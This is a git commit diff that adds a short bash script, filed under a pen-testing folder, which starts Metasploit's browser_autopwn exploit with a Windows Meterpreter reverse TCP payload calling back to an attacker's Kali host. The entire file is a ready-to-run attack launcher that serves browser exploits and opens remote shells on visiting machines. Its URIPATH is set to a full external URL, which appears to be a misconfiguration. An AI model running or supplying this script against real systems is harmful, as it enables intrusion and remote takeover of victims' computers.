c8b436fe5d4721e2672ac3dd5b57902032c06dc1
Gopi Gor <151388464+gopigor12@users.noreply.github.com>
2024-05-21 18:57:52 -0400

    Update client-side-automation.sh

--- Pen Testing/client-side-automation.sh
+++ Pen Testing/client-side-automation.sh
@@ -1,1 +1,15 @@
-
+#!/bin/bash 
+ 
+# Define variables 
+LHOST="Kali_IP"           
+LPORT="Listening_port"    
+URIPATH="https://canva.com"   
+PAYLOAD="windows/meterpreter/reverse_tcp"   
+ 
+# Start Metasploit and load the browser_autopwn module 
+msfconsole -q -x "use exploit/multi/browser/browser_autopwn; 
+                set PAYLOAD $PAYLOAD; 
+                set LHOST $LHOST;                              
+                set LPORT $LPORT; 
+                set URIPATH $URIPATH;                                 
+                exploit -j"    
